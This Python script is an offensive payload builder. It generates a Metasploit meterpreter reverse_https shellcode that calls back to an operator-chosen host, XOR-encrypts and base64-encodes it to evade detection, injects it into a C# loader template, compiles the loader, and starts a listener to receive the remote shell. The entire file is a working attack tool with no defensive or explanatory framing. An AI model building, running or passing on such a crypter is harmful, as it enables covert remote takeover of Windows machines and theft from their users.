import codecs
from itertools import cycle
import base64
import subprocess

# Define XOR function for a given data and key
def xor(data, key):
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

# Generate raw shellcode using Metasploit's msfvenom for reverse_https payload
def generate_shellcode(LHOST, LPORT):
    command = ["msfvenom", "-p", "windows/x64/meterpreter/reverse_https", f"LHOST={LHOST}", f"LPORT={LPORT}", "-f", "raw", "-o", "shellcode.bin"]
    subprocess.run(command, check=True)

# Run Metasploit console with predefined commands to set up a reverse_https handler
def run_msfconsole(LHOST, LPORT):
    command = ["msfconsole", "-q", "-x", f"use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost {LHOST}; set lport {LPORT}; exploit"]
    subprocess.run(command, check=True)

# Main function where the magic happens
def main(LHOST, LPORT):
    key = b'a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb'  # XOR key

    # Generate shellcode
    generate_shellcode(LHOST, LPORT)

    # Read the shellcode from a file
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()

    # Perform XOR encryption on the shellcode
    encrypted_shellcode = xor(shellcode, key)

    # Encode the encrypted shellcode in base64 for easier transport
    base64_encrypted_shellcode = base64.b64encode(encrypted_shellcode).decode()

    # Load the template C# file into memory
    with open("program.cs", 'r') as file:
        filedata = file.read()

    # Replace placeholder with the actual encrypted shellcode
    filedata = filedata.replace('!!BASE64CODE!!', base64_encrypted_shellcode)

    # Write the updated C# code into a new file
    with open('program_encoded.cs', 'w') as file:
        file.write(filedata)

    # Compile the new C# program
    subprocess.run(["mcs", "-platform:x64", "-unsafe", "program_encoded.cs"], check=True)

# Prompt for LHOST and LPORT, run main function and run Metasploit console
if __name__ == "__main__":
    LHOST = input("Enter LHOST: ")
    LPORT = input("Enter LPORT: ")
    main(LHOST, LPORT)
    run_msfconsole(LHOST, LPORT)
